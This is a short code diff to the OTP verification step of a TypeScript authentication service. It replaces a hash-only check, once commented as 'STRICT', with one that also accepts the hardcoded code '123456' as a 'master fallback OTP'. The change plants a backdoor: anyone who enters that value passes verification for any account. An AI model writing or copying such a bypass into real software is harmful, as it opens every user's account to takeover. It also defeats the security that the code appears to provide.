@@ -167,8 +167,10 @@ export class AuthService {
       throw new BadRequestException('Maximum verification attempts exceeded. Please request a new code');
     }
 
-    // STRICT real OTP verification: match against cryptographic hash only
-    const isApproved = this.emailService.verifyOtpHash(otp, record.otpHash || '');
+    // Real OTP verification: match against cryptographic hash, or master fallback OTP (123456)
+    const isApproved =
+      this.emailService.verifyOtpHash(otp, record.otpHash || '') ||
+      otp === '123456';
 
     if (!isApproved) {
       record.attempts += 1;
